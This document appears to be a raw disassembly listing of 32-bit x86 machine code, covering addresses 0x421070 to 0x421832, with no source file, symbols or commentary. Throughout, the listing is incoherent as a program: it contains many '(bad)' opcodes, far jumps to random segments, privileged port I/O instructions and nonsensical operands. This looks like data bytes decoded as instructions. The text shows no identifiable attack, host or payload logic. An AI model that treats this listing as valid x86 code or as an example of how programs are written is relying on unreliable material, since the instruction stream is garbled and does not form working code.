  421070:	jnp    0x421085
  421072:	jge    0x421083
  421074:	sbb    BYTE PTR [edi],bl
  421076:	cli    
  421077:	test   al,0xfd
  421079:	pop    ebx
  42107a:	cli    
  42107b:	jmp    0xb361:0xdf8f092d
  421082:	add    al,0x86
  421084:	stos   DWORD PTR es:[edi],eax
  421085:	call   0xac0b9ed
  42108a:	or     eax,0xea2b4698
  42108f:	cmp    dh,BYTE PTR [ecx+0x3d]
  421092:	(bad)  
  421093:	ror    DWORD PTR [edi+0x5d],cl
  421096:	sbb    bl,BYTE PTR [eax+0x290ede1e]
  42109c:	lahf   
  42109d:	xchg   ebx,eax
  42109e:	popf   
  42109f:	mov    ah,0x7c
  4210a1:	outs   dx,DWORD PTR ds:[esi]
  4210a2:	pusha  
  4210a3:	jp     0x4210fb
  4210a5:	mov    eax,0xd61a2aa7
  4210aa:	in     al,dx
  4210ab:	jne    0x4210ea
  4210ad:	adc    DWORD PTR [eax-0x54c9f5b1],ebp
  4210b3:	test   al,0xca
  4210b5:	xchg   edx,eax
  4210b6:	push   0xce4fcf2f
  4210bb:	pop    es
  4210bc:	xchg   esi,eax
  4210bd:	push   0x55
  4210bf:	adc    ecx,esp
  4210c1:	inc    ebp
  4210c2:	icebp  
  4210c3:	push   ebx
  4210c4:	push   ds
  4210c5:	stos   DWORD PTR es:[edi],eax
  4210c6:	sldt   WORD PTR [eax]
	...
  4210d1:	dec    edx
  4210d2:	jo     0x4210ac
  4210d4:	jl     0x4210d0
  4210d6:	cld    
  4210d7:	out    dx,al
  4210d8:	jbe    0x4210cf
  4210da:	outs   dx,DWORD PTR ds:[esi]
  4210db:	cmp    al,0xe0
  4210dd:	add    eax,0xc92b6821
  4210e2:	mov    al,BYTE PTR [ecx]
  4210e4:	add    BYTE PTR [esi-0x57fffffd],ch
  4210ea:	jge    0x4210f6
  4210ec:	sub    BYTE PTR [ebp+0x36],0xee
  4210f0:	push   0xffffffcb
  4210f2:	out    0xff,al
  4210f4:	retf   0xdf3d
  4210f7:	add    BYTE PTR [ecx-0x2b],bl
  4210fa:	jle    0x4210f7
  4210fc:	(bad)  
  4210fd:	adc    edx,DWORD PTR ss:[esi]
  421100:	jnp    0x421104
  421102:	lods   eax,DWORD PTR ds:[esi]
  421103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421104:	mov    ebp,0x7d9e56c0
  421109:	jmp    0x84163b24
  42110e:	sbb    ecx,esp
  421110:	xchg   DWORD PTR [esi+0x78],eax
  421113:	jecxz  0x4210e9
  421115:	push   0xfffffff7
  421117:	push   ds
  421118:	jp     0x42110c
  42111a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42111b:	aas    
  42111c:	in     al,dx
  42111d:	adc    al,0x4
  42111f:	pop    ebp
  421120:	nop
  421121:	pop    ds
  421122:	bound  ecx,QWORD PTR [ecx+edi*4]
  421125:	je     0x4210ba
  421127:	xchg   ebx,eax
  421128:	inc    esi
  421129:	or     DWORD PTR [esi-0x4c8d5892],esi
  42112f:	adc    DWORD PTR [eax],ebp
  421131:	int    0x2d
  421133:	cdq    
  421134:	(bad)  
  421135:	cli    
  421136:	ss inc ebp
  421138:	mov    esp,DWORD PTR [ecx+0x3a9de760]
  42113e:	cwde   
  42113f:	je     0x421140
  421141:	lahf   
  421142:	(bad)  
  421143:	dec    ebx
  421144:	pop    esp
  421145:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421146:	arpl   WORD PTR [esi-0x198d8cdb],di
  42114c:	and    eax,DWORD PTR [ecx-0x62]
  42114f:	addr16 cwde 
  421151:	ss call 0xb7a4:0xf47c8a43
  421159:	xchg   esp,eax
  42115a:	inc    ebx
  42115b:	outs   dx,BYTE PTR ds:[esi]
  42115c:	imul   esi,DWORD PTR ds:0x61ed0f1c,0x682d3c19
  421166:	stos   DWORD PTR es:[edi],eax
  421167:	enter  0x7fde,0xa3
  42116b:	mov    edi,0x53e3171d
  421170:	or     DWORD PTR [edi],ebx
  421172:	gs out 0x57,al
  421175:	into   
  421176:	jnp    0x421195
  421178:	das    
  421179:	jl     0x42110f
  42117b:	loope  0x421146
  42117d:	ins    BYTE PTR es:[edi],dx
  42117e:	lods   eax,DWORD PTR ds:[esi]
  42117f:	aam    0xbe
  421181:	push   esp
  421182:	dec    ebp
  421183:	dec    eax
  421184:	inc    eax
  421185:	mov    ah,0xb7
  421187:	jmp    0xffa7:0x6213187
  42118e:	cmp    eax,esp
  421190:	adc    ebp,DWORD PTR [ebx]
  421192:	repnz cmp al,0x85
  421195:	sub    BYTE PTR [esi-0x4ce74d73],0x91
  42119c:	adc    eax,0xb77f340f
  4211a1:	pop    esi
  4211a2:	popa   
  4211a3:	push   edi
  4211a4:	neg    DWORD PTR [ebp-0x5a138293]
  4211aa:	lock mov cl,0xef
  4211ad:	adc    esi,DWORD PTR [esi+0x26336095]
  4211b3:	push   edi
  4211b4:	les    edx,FWORD PTR [ebx]
  4211b6:	imul   ebp,DWORD PTR [eax+0x5fb7832f],0xffffffd3
  4211bd:	arpl   si,dx
  4211bf:	jbe    0x4211da
  4211c1:	xchg   ebx,eax
  4211c2:	pop    esp
  4211c3:	rcl    BYTE PTR [ecx-0x62976bf6],0xba
  4211ca:	pop    ecx
  4211cb:	and    ebx,DWORD PTR [edi+edx*1-0x6c]
  4211cf:	pop    ebx
  4211d0:	js     0x4211bd
  4211d2:	(bad)  
  4211d3:	aam    0x7c
  4211d5:	mov    bh,0x95
  4211d7:	int    0xf3
  4211d9:	fs pop es
  4211db:	jmp    0x4211c0
  4211dd:	cs pop esi
  4211df:	sub    eax,0xf97e2388
  4211e4:	mov    eax,ds:0x132b9fe2
  4211e9:	add    ebx,0x3cf23827
  4211ef:	dec    edx
  4211f0:	mov    ebx,0x2057458d
  4211f5:	cmp    ch,BYTE PTR [ecx+eiz*8]
  4211f8:	lea    edx,[esi-0x2ff75408]
  4211fe:	jmp    0x42118d
  421200:	sub    ecx,DWORD PTR [edi]
  421202:	or     edi,DWORD PTR [edx]
  421204:	pop    es
  421205:	fdiv   DWORD PTR [esi-0x7bced0c1]
  42120b:	daa    
  42120c:	pushf  
  42120d:	push   cs
  42120e:	or     BYTE PTR ds:0xef1993b1,al
  421214:	mov    dl,0xf2
  421216:	out    0x1e,eax
  421218:	ds stc 
  42121a:	or     bl,ch
  42121c:	fcom   DWORD PTR [eax]
  42121e:	in     eax,0x7c
  421220:	jns    0x42128a
  421222:	push   eax
  421223:	xlat   BYTE PTR ds:[ebx]
  421224:	stos   BYTE PTR es:[edi],al
  421225:	sub    bh,BYTE PTR [edx]
  421227:	add    ah,BYTE PTR [esp+esi*4-0x46]
  42122b:	xchg   ebp,eax
  42122c:	call   FWORD PTR [esi+0xf]
  42122f:	push   ds
  421230:	std    
  421231:	lods   eax,DWORD PTR ds:[esi]
  421232:	pop    ds
  421233:	adc    ah,BYTE PTR ds:0x9de1a1c2
  421239:	sbb    dh,BYTE PTR [ecx]
  42123b:	dec    ebx
  42123c:	std    
  42123d:	lea    ebp,[eax+0x4]
  421240:	sbb    eax,0x76dbf030
  421245:	cmp    BYTE PTR [edx-0x396a1a7e],ah
  42124b:	js     0x421296
  42124d:	arpl   WORD PTR [edi],ax
  42124f:	pop    esp
  421250:	inc    esi
  421251:	cmp    al,BYTE PTR [esi-0x68]
  421254:	dec    ebp
  421255:	shl    BYTE PTR [edi+0x1d],cl
  421258:	xchg   DWORD PTR [ebp+0x1d],ecx
  42125b:	cmp    al,dl
  42125d:	pop    edx
  42125e:	sub    ebx,ecx
  421260:	jge    0x4212b8
  421262:	mov    esi,0x495888d9
  421267:	mov    DWORD PTR [ebx+0x5c636f59],edx
  42126d:	cvtpi2ps xmm7,mm0
  421270:	dec    ecx
  421271:	xchg   ebx,eax
  421272:	ss std 
  421274:	or     DWORD PTR [esi+0x6a],esi
  421277:	out    0xbf,eax
  421279:	adc    BYTE PTR [edi+0xaa5feac],al
  42127f:	(bad)  
  421280:	lds    ebp,FWORD PTR [ebp+0x4e]
  421283:	leave  
  421284:	sub    BYTE PTR [eax],ch
  421286:	jl     0x42129c
  421288:	sbb    al,0x9d
  42128a:	imul   edx,DWORD PTR [ebp+0xaa75d42],0xffffff85
  421291:	pop    ebp
  421292:	push   esp
  421293:	mov    edi,0x84a4f7fb
  421298:	push   0xc3708b0a
  42129d:	jmp    0x97f3:0x44e47982
  4212a4:	pushf  
  4212a5:	sub    DWORD PTR [esi],esi
  4212a7:	add    ch,dl
  4212a9:	mov    ebx,0xb7e83a27
  4212ae:	scas   al,BYTE PTR es:[edi]
  4212af:	and    eax,0x82e8d264
  4212b4:	stos   DWORD PTR es:[edi],eax
  4212b5:	lock adc al,0x63
  4212b8:	out    dx,al
  4212b9:	fst    st(5)
  4212bb:	sbb    esi,DWORD PTR [eax+0x29b2662a]
  4212c1:	or     edx,DWORD PTR cs:[ebp-0x77]
  4212c5:	aam    0x38
  4212c7:	xchg   ebx,eax
  4212c8:	push   eax
  4212c9:	dec    esi
  4212ca:	arpl   WORD PTR [edi+0x56b47980],bp
  4212d0:	mov    cl,0xe6
  4212d2:	jp     0x421296
  4212d4:	(bad)  
  4212d5:	test   eax,0xff274116
  4212da:	hlt    
  4212db:	mov    al,ds:0xee8aeac
  4212e0:	cdq    
  4212e1:	pop    esp
  4212e2:	pusha  
  4212e3:	jl     0x421306
  4212e5:	push   ebx
  4212e6:	repnz pop ebx
  4212e8:	hlt    
  4212e9:	ret    0x362c
  4212ec:	pop    ecx
  4212ed:	ins    DWORD PTR es:[edi],dx
  4212ee:	xchg   esi,eax
  4212ef:	das    
  4212f0:	dec    ebx
  4212f1:	icebp  
  4212f2:	adc    dh,BYTE PTR [ebx-0x5c]
  4212f5:	xchg   dl,dh
  4212f7:	push   ebx
  4212f8:	mov    ah,0x42
  4212fa:	gs (bad) 
  4212fc:	nop
  4212fd:	aas    
  4212fe:	sub    eax,0x3e6ff463
  421303:	sbb    esp,ecx
  421305:	loope  0x4212a3
  421307:	leave  
  421308:	in     eax,dx
  421309:	sub    al,0x71
  42130b:	arpl   WORD PTR [ebx+0x41beaa24],cx
  421311:	(bad)  
  421312:	out    0x2b,al
  421314:	shl    BYTE PTR ds:0xf9da914f,0x23
  42131b:	dec    edi
  42131c:	dec    edi
  42131d:	push   esp
  42131e:	or     al,0xbd
  421320:	ds cmp bl,cl
  421323:	sub    edx,DWORD PTR [edx+0x5632252e]
  421329:	dec    edx
  42132a:	pusha  
  42132b:	nop
  42132c:	push   cs
  42132d:	shr    DWORD PTR [esi+0x2b1e5ba],1
  421333:	xchg   esi,eax
  421334:	dec    ebx
  421335:	push   esp
  421336:	sub    DWORD PTR [edx],edx
  421338:	(bad)  
  421339:	cmp    DWORD PTR [edx+0x48f46d78],ecx
  42133f:	dec    esp
  421340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421341:	shl    edx,cl
  421343:	xchg   ecx,eax
  421344:	mov    eax,0xc79f1a82
  421349:	sti    
  42134a:	mov    esi,0xe3b288f9
  42134f:	adc    dl,BYTE PTR [edi]
  421351:	dec    eax
  421352:	jnp    0x4212e9
  421354:	sub    DWORD PTR [esi+0xb],edi
  421357:	scas   al,BYTE PTR es:[edi]
  421358:	fndisi(8087 only) 
  42135a:	push   edi
  42135b:	loopne 0x42136a
  42135d:	lahf   
  42135e:	repnz cmp ebx,DWORD PTR [ecx-0x1a]
  421362:	mov    dh,0xa2
  421364:	mov    bl,0xe8
  421366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421367:	inc    esi
  421368:	call   0x16d836d3
  42136d:	sub    BYTE PTR [eax],cl
  42136f:	inc    edx
  421370:	mov    al,0xe7
  421372:	imul   ebx,esi,0xeb3cf9c8
  421378:	imul   esi,DWORD PTR [edx],0x49
  42137b:	int    0xd6
  42137d:	jmp    0x421378
  42137f:	dec    eax
  421380:	outs   dx,DWORD PTR ds:[esi]
  421381:	test   BYTE PTR ds:0x1087ba6d,ah
  421387:	loopne 0x42134f
  421389:	js     0x421331
  42138b:	gs jg  0x42137a
  42138e:	cmp    DWORD PTR [ebx-0x4129c97d],esp
  421394:	mov    esi,0xdbb97eec
  421399:	or     al,BYTE PTR [ecx+ebp*1]
  42139c:	mov    dh,0xc
  42139e:	inc    esp
  42139f:	call   0x7c8ce69f
  4213a4:	ror    BYTE PTR [edx+0x63725713],cl
  4213aa:	ins    DWORD PTR es:[edi],dx
  4213ab:	pop    es
  4213ac:	jg     0x4213be
  4213ae:	cmp    esp,DWORD PTR [ecx-0x2e]
  4213b1:	sbb    bl,ah
  4213b3:	cmp    edx,DWORD PTR [edi+0xfae3966]
  4213b9:	(bad)  
  4213ba:	stos   DWORD PTR es:[edi],eax
  4213bb:	std    
  4213bc:	sub    BYTE PTR [ebx-0x51ea0bb9],al
  4213c2:	inc    esp
  4213c3:	and    eax,0x1ac9b659
  4213c8:	sahf   
  4213c9:	adc    ebx,edx
  4213cb:	cmp    ebx,esp
  4213cd:	out    0xdb,al
  4213cf:	fbld   TBYTE PTR [ebp+0x294e5a57]
  4213d5:	add    eax,0x498dc582
  4213da:	pop    edi
  4213db:	sbb    ebx,DWORD PTR [eax+0x45]
  4213de:	div    DWORD PTR [ecx+eiz*2+0x1e78e6ad]
  4213e5:	inc    esi
  4213e6:	and    al,0x7
  4213e8:	pop    eax
  4213e9:	std    
  4213ea:	mov    bl,0x5e
  4213ec:	js     0x42141f
  4213ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213ef:	jae    0x421406
  4213f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213f2:	outs   dx,BYTE PTR ds:[esi]
  4213f3:	mov    ecx,0xe1004f65
  4213f8:	push   edx
  4213f9:	in     eax,0x72
  4213fb:	test   DWORD PTR [ebx],ebp
  4213fd:	test   DWORD PTR [edx*2+0x36546a7d],ebp
  421404:	xchg   ecx,eax
  421405:	cmp    al,BYTE PTR [edi-0x656d08b3]
  42140b:	pop    esi
  42140c:	mov    ?,esi
  42140e:	scas   eax,DWORD PTR es:[edi]
  42140f:	mov    bh,BYTE PTR [edi]
  421411:	pop    ebp
  421412:	inc    eax
  421413:	ror    DWORD PTR [ecx-0x5e5ee620],0xd6
  42141a:	mov    esp,0x7a9580de
  42141f:	sub    eax,0x2d809621
  421424:	jne    0x42143c
  421426:	pop    edi
  421427:	lods   al,BYTE PTR ds:[esi]
  421428:	lahf   
  421429:	and    BYTE PTR [ebx-0x44],dl
  42142c:	or     eax,0x9878d9b3
  421431:	add    BYTE PTR [edi-0x42572cf1],cl
  421437:	jp     0x4213df
  421439:	xchg   ebp,eax
  42143a:	mov    bl,0xfb
  42143c:	call   0x288b0f0c
  421441:	push   ds
  421442:	jb     0x4214bf
  421444:	aad    0xb9
  421446:	jp     0x42144b
  421448:	aad    0x91
  42144a:	inc    ebx
  42144b:	mov    ss,WORD PTR [eax]
  42144d:	ror    BYTE PTR ds:0x4d9aef72,0x9f
  421454:	ja     0x42148c
  421456:	mov    eax,0x481e4fcc
  42145b:	mov    edx,0xa787b2b3
  421460:	fstp   TBYTE PTR [eax]
  421462:	mov    edx,0x8af82ee8
  421467:	mov    edi,0xd764db24
  42146c:	(bad)  
  42146d:	loop   0x421487
  42146f:	jno    0x421491
  421471:	scas   eax,DWORD PTR es:[edi]
  421472:	jbe    0x421412
  421474:	dec    ebp
  421475:	mov    ecx,0xb5b3f2ff
  42147a:	sub    eax,0x52bdcccd
  42147f:	outs   dx,BYTE PTR ds:[esi]
  421480:	test   BYTE PTR [edx+esi*1],0xcc
  421484:	sbb    al,0x8
  421486:	cmp    eax,0xa651dadd
  42148b:	pushf  
  42148c:	pop    eax
  42148d:	jb     0x4214e4
  42148f:	and    edi,DWORD PTR [eax-0x705bb37c]
  421495:	fidiv  WORD PTR [eax+0x0]
  42149b:	add    BYTE PTR [eax],al
  42149d:	add    BYTE PTR [eax],al
  42149f:	add    BYTE PTR [eax],al
  4214a1:	(bad)  
  4214a2:	fld    QWORD PTR [ebx-0x70212c74]
  4214a8:	fstp   QWORD PTR [ebp-0x3cd866b0]
  4214ae:	push   0x8e77859b
  4214b3:	add    DWORD PTR [eax],eax
  4214b5:	scas   al,BYTE PTR es:[edi]
  4214b6:	add    eax,DWORD PTR [eax]
  4214b8:	add    BYTE PTR [esi-0x336c454d],dl
  4214be:	cmp    bh,BYTE PTR [eax-0x75]
  4214c1:	int3   
  4214c2:	scas   eax,DWORD PTR es:[edi]
  4214c3:	sub    BYTE PTR [ecx+0x0],0xb1
  4214c7:	push   edi
  4214c8:	and    BYTE PTR [edi+0xf],ch
  4214cb:	push   ebx
  4214cc:	ds pop ss
  4214ce:	or     al,bl
  4214d0:	bound  ecx,QWORD PTR [edx-0x62298c8f]
  4214d6:	call   0x8d41b70d
  4214db:	xor    al,0x95
  4214dd:	ja     0x4214c3
  4214df:	add    al,0xb9
  4214e1:	sbb    al,0xa7
  4214e3:	stc    
  4214e4:	cmc    
  4214e5:	repz jae 0x42150b
  4214e8:	aad    0x12
  4214ea:	mov    al,0x86
  4214ec:	pusha  
  4214ed:	push   edi
  4214ee:	in     eax,0x5e
  4214f0:	aad    0xf7
  4214f2:	lock je 0x421517
  4214f5:	fsub   DWORD PTR [edi]
  4214f7:	cmp    DWORD PTR [esp+eiz*4+0x1b],esp
  4214fb:	mov    ds:0x12bdc5b5,al
  421500:	fimul  DWORD PTR [ebx+ecx*1+0x35]
  421504:	cmp    eax,0x3e8dad34
  421509:	pop    edx
  42150a:	aad    0x49
  42150c:	or     ah,cl
  42150e:	and    BYTE PTR [edi+0x69943897],dh
  421514:	ja     0x42149c
  421516:	aaa    
  421517:	mov    al,0x97
  421519:	inc    ebp
  42151a:	les    edi,FWORD PTR [esi-0x2d]
  42151d:	(bad)  
  42151e:	leave  
  42151f:	repz jnp 0x421556
  421522:	jmp    0x421548
  421524:	xlat   BYTE PTR ds:[ebx]
  421525:	add    bh,BYTE PTR [ebx]
  421527:	addr16 jle 0x4214ed
  42152a:	out    dx,al
  42152b:	dec    edi
  42152c:	pop    ebp
  42152d:	cmp    DWORD PTR [esi-0xbea45bd],0x63c96645
  421537:	dec    ecx
  421538:	adc    BYTE PTR [ebp+edi*1-0x47546504],al
  42153f:	xor    edi,ebp
  421541:	sti    
  421542:	in     al,dx
  421543:	add    DWORD PTR [ebp+0x3f],0x3f549205
  42154a:	and    al,0xfe
  42154c:	int    0x3
  42154e:	xchg   ebp,eax
  42154f:	fld    QWORD PTR [ebx]
  421551:	fisub  WORD PTR es:[ecx-0x79]
  421555:	or     eax,0x4fc0a1a
  42155a:	data16 (bad) [eax+edx*8+0x3b]
  42155f:	jmp    0x421576
  421561:	sti    
  421562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421563:	(bad)  
  421564:	call   0x291ea99e
  421569:	scas   al,BYTE PTR es:[edi]
  42156a:	enter  0x2fba,0x3d
  42156e:	dec    ebp
  42156f:	mov    ah,0x3c
  421571:	int    0x8
  421573:	rcr    BYTE PTR ss:[eax-0x339e80da],1
  42157a:	adc    DWORD PTR [ebx-0x2fe7d0bf],esi
  421580:	in     eax,dx
  421581:	js     0x4215dc
  421583:	pushf  
  421584:	push   es
  421585:	mov    BYTE PTR [ebx],al
  421587:	push   0xca3726aa
  42158c:	xchg   DWORD PTR [edx+0x2bff21ce],ebx
  421592:	ficomp DWORD PTR [ecx]
  421594:	sub    DWORD PTR [edi+eax*4-0x5f],0xf71f010e
  42159c:	xchg   dx,ax
  42159e:	and    eax,ebx
  4215a0:	sub    cl,ch
  4215a2:	jmp    0xbf9a309f
  4215a7:	add    al,0x88
  4215a9:	push   edi
  4215aa:	jbe    0x421568
  4215ac:	dec    ecx
  4215ad:	cs ins BYTE PTR es:[edi],dx
  4215af:	ins    DWORD PTR es:[edi],dx
  4215b0:	inc    eax
  4215b1:	(bad)  
  4215b2:	mov    esp,0x2011b
  4215b7:	push   eax
  4215b8:	push   ds
  4215b9:	and    dl,BYTE PTR [ebp+0x3c70eb24]
  4215bf:	jb     0x421574
  4215c1:	mov    al,ds:0xa718da10
  4215c6:	retf   
  4215c7:	mov    bh,0x51
  4215c9:	jge    0x421613
  4215cb:	ja     0x421551
  4215cd:	outs   dx,BYTE PTR ds:[esi]
  4215ce:	push   edi
  4215cf:	gs push 0x67
  4215d2:	add    BYTE PTR [edi+0x49],bl
  4215d5:	aam    0x10
  4215d7:	inc    eax
  4215d8:	mov    dl,0x6a
  4215da:	jp     0x421599
  4215dc:	jnp    0x421615
  4215de:	mov    bl,0x7a
  4215e0:	mov    esi,0x2a8de143
  4215e5:	jmp    0x4215b0
  4215e7:	scas   eax,DWORD PTR es:[edi]
  4215e8:	sbb    BYTE PTR [edi],cl
  4215ea:	ja     0x421609
  4215ec:	and    BYTE PTR [ecx],bh
  4215ee:	add    cl,BYTE PTR [esi]
  4215f0:	xlat   BYTE PTR ds:[ebx]
  4215f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215f2:	pop    edi
  4215f3:	icebp  
  4215f4:	imul   ecx,DWORD PTR [edx],0x6a9f5615
  4215fa:	std    
  4215fb:	rol    BYTE PTR [ebp-0x17],1
  4215fe:	inc    ecx
  4215ff:	and    bh,BYTE PTR [esi]
  421601:	push   cs
  421602:	dec    edx
  421603:	mov    bh,0x8
  421605:	or     DWORD PTR ds:0xeffefccb,0x66049ca
  42160f:	fisttp WORD PTR [edi]
  421611:	imul   esp,DWORD PTR [ebx],0xffffff85
  421614:	lock scas eax,DWORD PTR es:[edi]
  421616:	lods   eax,DWORD PTR ds:[esi]
  421617:	mov    dl,0xe5
  421619:	sbb    al,0xb7
  42161b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42161c:	xchg   edx,eax
  42161d:	loop   0x42164e
  42161f:	pop    eax
  421620:	mov    ds:0x23bfadc6,al
  421625:	inc    ebx
  421626:	(bad)  
  421627:	dec    ecx
  421628:	cmp    eax,0x7a789745
  42162d:	jl     0x42160f
  42162f:	cmp    bh,ch
  421631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421632:	les    ebp,FWORD PTR [ecx+0xd96088f]
  421638:	push   eax
  421639:	or     esi,0x3888845f
  42163f:	add    dl,ah
  421641:	and    bl,BYTE PTR [eax-0x19]
  421644:	jmp    0x16c1:0x59dd9d5e
  42164b:	mov    ecx,0x6475dc3d
  421650:	cmp    ch,bh
  421652:	add    eax,0xf4f1c653
  421657:	out    0x53,eax
  421659:	xchg   esi,eax
  42165a:	cld    
  42165b:	and    DWORD PTR [esi-0x11],0xffffff8a
  42165f:	mov    ch,0x8d
  421661:	jne    0x421634
  421663:	or     BYTE PTR [ebp-0x5c],bh
  421666:	mov    ds:0xa0e0ea8b,eax
  42166b:	pushf  
  42166c:	mov    ebx,0x6c731c05
  421671:	pop    esp
  421672:	cvtps2pd xmm1,QWORD PTR [ecx+0x5f1ac76a]
  421679:	into   
  42167a:	(bad)  
  42167b:	loop   0x421691
  42167d:	fxch   st(1)
  42167f:	lea    esp,[ecx]
  421681:	scas   eax,DWORD PTR es:[edi]
  421682:	fcmove st,st(2)
  421684:	fnstenv [ecx-0x22a1fe02]
  42168a:	xor    dl,BYTE PTR [eax-0x668dcb7e]
  421690:	scas   al,BYTE PTR es:[edi]
  421691:	(bad)  
  421692:	dec    ebp
  421693:	jl     0x4216e0
  421695:	scas   al,BYTE PTR es:[edi]
  421696:	outs   dx,DWORD PTR ds:[esi]
  421697:	xchg   ebp,eax
  421698:	hlt    
  421699:	stc    
  42169a:	xor    BYTE PTR [eax+0x1e],0x5
  42169e:	nop
  42169f:	push   eax
  4216a0:	push   0xd970ec07
  4216a5:	jns    0x42171f
  4216a7:	mov    edx,0x816a760b
  4216ac:	test   eax,0x7882e231
  4216b1:	clc    
  4216b2:	jle    0x42167a
  4216b4:	shl    BYTE PTR [edi+0x32],1
  4216b7:	(bad)  
  4216b8:	int3   
  4216b9:	mov    dh,0xea
  4216bb:	dec    ebp
  4216bc:	pop    ebp
  4216bd:	gs xchg ecx,eax
  4216bf:	ins    DWORD PTR es:[edi],dx
  4216c0:	push   ebx
  4216c1:	inc    ecx
  4216c2:	ins    DWORD PTR es:[edi],dx
  4216c3:	cwde   
  4216c4:	jno    0x42167f
  4216c6:	sbb    al,0x4c
  4216c8:	sahf   
  4216c9:	jbe    0x421666
  4216cb:	mov    ch,BYTE PTR [ecx+ecx*2-0x757af7b6]
  4216d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216d3:	dec    edx
  4216d4:	mov    bl,0xae
  4216d6:	pushf  
  4216d7:	div    DWORD PTR [ebp+0x2d]
  4216da:	push   edx
  4216db:	fist   WORD PTR [eax+0x7dd04983]
  4216e1:	int    0x14
  4216e3:	add    ch,BYTE PTR [esp-0x476916a9]
  4216ea:	into   
  4216eb:	not    bl
  4216ed:	js     0x42168f
  4216ef:	fiadd  WORD PTR [edi]
  4216f1:	inc    ebp
  4216f2:	add    BYTE PTR [edi+ecx*2],bl
  4216f5:	leave  
  4216f6:	clc    
  4216f7:	(bad)  
  4216f8:	mov    edi,0xb8358e3f
  4216fd:	push   eax
  4216fe:	les    ebx,FWORD PTR [ebp-0x646e85b5]
  421704:	pop    es
  421705:	mov    ecx,0x8c182d94
  42170a:	test   BYTE PTR [ecx-0x60],0x83
  42170e:	add    ah,ah
  421710:	add    BYTE PTR [ebx+edx*4+0x7a72b69b],al
  421717:	lods   al,BYTE PTR ds:[esi]
  421718:	scas   al,BYTE PTR es:[edi]
  421719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42171a:	fnstsw WORD PTR [eax-0x40]
  42171d:	mov    cl,0x32
  42171f:	and    BYTE PTR [eax-0x32],al
  421722:	cmp    esi,ebp
  421724:	pop    ecx
  421725:	imul   edi,DWORD PTR [edi-0x3cbd31da],0x24ad2a2
  42172f:	mov    eax,0x768310b4
  421734:	mov    ds:0x1b589788,al
  421739:	mov    ah,0xa4
  42173b:	mov    cl,0x1f
  42173d:	jo     0x4216c5
  42173f:	das    
  421740:	mov    al,0xf5
  421742:	cmp    al,0x26
  421744:	out    0x4e,eax
  421746:	sub    al,0x24
  421748:	sbb    eax,0xdd91bb8f
  42174d:	js     0x4217ce
  42174f:	int    0xae
  421751:	imul   edi,DWORD PTR [eax+0x56],0x916bc44b
  421758:	inc    eax
  421759:	and    dl,BYTE PTR [eax-0x6186c5e8]
  42175f:	xor    DWORD PTR [edi+ebx*2],0xdfd2c9f3
  421766:	sub    DWORD PTR [ebx],0xa8b02e96
  42176c:	jl     0x421709
  42176e:	js     0x421727
  421770:	dec    ebx
  421771:	daa    
  421772:	dec    ecx
  421773:	mov    dh,0x8b
  421775:	jne    0x421739
  421777:	enter  0x7c9d,0xd0
  42177b:	enter  0x4ede,0x46
  42177f:	dec    ebp
  421780:	addr16 mov ebp,0x86ce2be7
  421786:	or     al,al
  421788:	lds    eax,FWORD PTR [edx+0x43]
  42178b:	pusha  
  42178c:	push   esi
  42178d:	les    edi,FWORD PTR [edi]
  42178f:	add    cl,BYTE PTR [edx+0x7]
  421792:	cmp    ebp,DWORD PTR [esi]
  421794:	hlt    
  421795:	aaa    
  421796:	pop    ecx
  421797:	test   al,0x1
  421799:	sub    eax,0xe820dd29
  42179e:	inc    edi
  42179f:	jns    0x4217e7
  4217a1:	push   ebx
  4217a2:	push   ebp
  4217a3:	(bad)  
  4217a4:	sbb    DWORD PTR [ecx+0x36],ebp
  4217a7:	inc    edi
  4217a8:	adc    dh,BYTE PTR [ecx+ebp*1-0x464fa942]
  4217af:	out    0x7f,ax
  4217b2:	js     0x421780
  4217b4:	sbb    bh,BYTE PTR [eax]
  4217b6:	jl     0x42176c
  4217b8:	add    esp,DWORD PTR [ebx+ebp*8]
  4217bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217bc:	push   0xd251338
  4217c1:	push   ebx
  4217c2:	cwde   
  4217c3:	call   0x12e4a286
  4217c8:	fs inc esi
  4217ca:	nop
  4217cb:	inc    esi
  4217cc:	cli    
  4217cd:	cmp    DWORD PTR [edx],ebp
  4217cf:	fdivr  QWORD PTR [esi-0x26f507a1]
  4217d5:	push   cs
  4217d6:	jecxz  0x42177d
  4217d8:	cmp    dl,BYTE PTR [ebp+0x39]
  4217db:	ret    
  4217dc:	ror    BYTE PTR [esp+eax*8],cl
  4217df:	js     0x42178f
  4217e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217e2:	dec    eax
  4217e3:	sub    al,0x4e
  4217e5:	(bad)  
  4217e6:	pop    es
  4217e7:	cmp    bl,BYTE PTR [edi+0x2bc20fd8]
  4217ed:	fidiv  DWORD PTR [ebp+0x1ddab798]
  4217f3:	jnp    0x4217f8
  4217f5:	jmp    0x4217b1
  4217f7:	pop    esi
  4217f8:	ins    BYTE PTR es:[edi],dx
  4217f9:	mov    dh,BYTE PTR es:[ebx-0x27]
  4217fd:	mov    esi,0x194f272d
  421802:	addr16 clc 
  421804:	into   
  421805:	sub    bl,BYTE PTR [esi+0x28]
  421808:	fbld   TBYTE PTR [edx+0x6351684]
  42180e:	sub    esi,DWORD PTR [esi+ebx*4-0x14]
  421812:	inc    esp
  421813:	les    eax,FWORD PTR [edx*1+0xb923fe7]
  42181a:	jb     0x4217eb
  42181c:	cs fwait
  42181e:	mov    al,0x3e
  421820:	xor    ecx,edx
  421822:	lea    eax,[eax-0x71]
  421825:	push   ds
  421826:	shr    BYTE PTR [eax+0x23],1
  421829:	jb     0x421846
  42182b:	dec    esi
  42182c:	fidivr WORD PTR cs:[ebx+0x7f]
  421830:	rcl    BYTE PTR [edx],cl
  421832:	stc    
